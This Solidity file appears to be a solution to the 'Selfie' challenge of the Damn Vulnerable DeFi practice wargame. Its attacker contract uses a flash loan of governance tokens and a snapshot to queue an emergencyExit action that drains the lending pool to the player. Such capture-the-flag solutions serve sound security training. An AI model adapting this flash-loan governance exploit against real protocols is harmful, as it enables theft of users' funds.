// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

/**
 * @title SelfieAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerSelfie  {

    DamnValuableTokenSnapshot public immutable token;
    SimpleGovernance public immutable governance;
    SelfiePool  public immutable selfilePool;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
address public player;
  


    constructor(address _token, address _governance , address _selfiePool , address _player) {
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        selfilePool = SelfiePool(_selfiePool);
        player=_player;
    }



    function attack(
        uint256 _amount
    ) external  {
    selfilePool.flashLoan(IERC3156FlashBorrower(address(this)),address(token),_amount,"");
    } //


    function onFlashLoan(address sender , address _token , uint256 amount , uint256 votes , bytes calldata _data ) external returns(bytes32){
    token.snapshot();
    governance.queueAction(address(selfilePool) , 0 , abi.encodeWithSignature("emergencyExit(address)",player));
    ERC20Snapshot(_token).approve(address(selfilePool) , amount);
return CALLBACK_SUCCESS;
    }
}
